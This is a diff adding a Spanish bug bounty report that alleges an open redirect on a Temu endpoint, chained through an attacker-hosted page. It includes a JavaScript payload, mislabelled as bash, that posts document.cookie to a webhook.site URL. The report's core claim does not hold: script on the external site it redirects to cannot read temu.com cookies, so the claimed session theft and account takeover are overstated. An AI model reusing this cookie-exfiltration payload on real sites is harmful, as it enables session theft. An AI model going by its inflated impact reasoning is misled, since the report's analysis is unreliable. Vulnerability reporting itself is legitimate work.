@@ -1,0 +1,74 @@
+#📄 Contenido para docs/report.txt:
+
+# 🎯 Vulnerabilidad crítica en Temu: Open Redirect + XSS + Robo de cookies
+
+## 🧠 Descripción
+
+Existe una vulnerabilidad de redirección abierta en el endpoint:
+
+https://www.temu.com/universal-link?redirect=
+
+Esto permite a un atacante redirigir al usuario a un sitio externo **malicioso** controlado por el atacante. Este sitio puede alojar scripts maliciosos para ejecutar ataques XSS reflejados, exfiltración de cookies o robo de sesión.
+
+---
+
+## 💥 Impacto
+
+Un atacante puede:
+
+- Redirigir a usuarios legítimos a sitios controlados.
+- Ejecutar JavaScript malicioso tras la redirección (XSS).
+- Capturar cookies de sesión e información sensible.
+- Tomar control total de cuentas si no hay protección `HttpOnly` o `SameSite`.
+
+---
+
+## 🔬 Steps to Reproduce
+
+1. Abre la siguiente URL desde un navegador:
+
+https://www.temu.com/universal-link?redirect=https://temu-vuln-hunter-pro.vercel.app/redirect?url=https://webhook.site/32a0eb40-6f73-46d8-ae79-42f7535375e2
+
+
+2. Esta redirecciona automáticamente a:
+
+https://temu-vuln-hunter-pro.vercel.app/redirect?url=https://webhook.site/...
+
+
+3. Desde ahí se carga un `poc.html` malicioso que ejecuta JavaScript.
+
+4. El script en `poc.html` envía `document.cookie` a un webhook externo.
+
+---
+
+## 🔐 Payload usado
+
+```bash
+fetch("https://webhook.site/32a0eb40-6f73-46d8-ae79-42f7535375e2", {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify({ cookie: document.cookie })
+});
+
+#✅ Recomendaciones
+
+Validar que el parámetro redirect sólo permita dominios internos.
+
+Bloquear esquemas http://, https:// ajenos a Temu.
+
+Implementar Content-Security-Policy, X-Frame-Options, y cookies HttpOnly.
+
+#🧠 Autor
+
+Jonathan Jiménez
+
+Alias HackerOne: jimenez7
+
+Contacto: jimenez7@wearehackerone.com
+
+
+---
+
+
+
+
